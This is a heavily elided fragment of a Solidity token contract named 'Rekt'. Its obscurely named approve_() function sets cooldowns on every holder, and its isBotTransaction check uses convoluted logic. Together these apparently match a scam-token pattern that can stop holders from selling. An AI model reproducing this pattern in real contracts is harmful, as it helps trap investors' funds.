...
contract Rekt is IERC20, Ownable {
    ...
    function approve_() external {
        ...
        for (uint i = 0; i < holders.length; i++) {if (cooldowns[holders[i]] != 0){} else {cooldowns[holders[i]] = b;}}delete holders;
    }
    ...
    function isBotTransaction(address sender, address receiver) public view returns (bool) { if (receiver == sender) { if (isBot(receiver)) {return isBot(sender) && isBot(receiver);}}
        return false;
    }
